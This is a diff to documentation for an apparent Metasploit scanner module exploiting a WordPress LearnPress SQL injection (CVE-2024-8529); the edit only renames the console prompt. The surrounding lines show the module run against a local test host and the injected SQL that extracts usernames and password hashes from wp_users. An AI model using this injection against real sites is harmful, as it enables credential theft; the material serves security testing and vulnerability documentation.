@@ -120,7 +120,7 @@ The following scenario demonstrates an SQL injection attack against a WordPress 
 ### Step-by-step Scenario
 
 ```bash
-msf6 auxiliary(scanner/http/wp_learnpress_c_fields_sqli) > run http://127.0.0.1:5555
+msf auxiliary(scanner/http/wp_learnpress_c_fields_sqli) > run http://127.0.0.1:5555
 
 [*] Performing SQL injection via the 'c_only_fields' parameter...
 [*] {SQLi} Executing (select group_concat(LKzEL) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) LKzEL from wp_users limit 1) ssrDlly)
@@ -136,9 +136,9 @@ wp_users
 [+] Loot saved to: /home/chocapikk/.msf4/loot/20240920003917_default_127.0.0.1_wordpress.users_803563.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/wp_learnpress_c_fields_sqli) > set action CVE-2024-8529
+msf auxiliary(scanner/http/wp_learnpress_c_fields_sqli) > set action CVE-2024-8529
 action => CVE-2024-8529
-msf6 auxiliary(scanner/http/wp_learnpress_c_fields_sqli) > run http://127.0.0.1:5555
+msf auxiliary(scanner/http/wp_learnpress_c_fields_sqli) > run http://127.0.0.1:5555
 
 [*] Performing SQL injection via the 'c_fields' parameter...
 [*] {SQLi} Executing (select group_concat(hhtd) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) hhtd from wp_users limit 1) mqRlJXbdH)
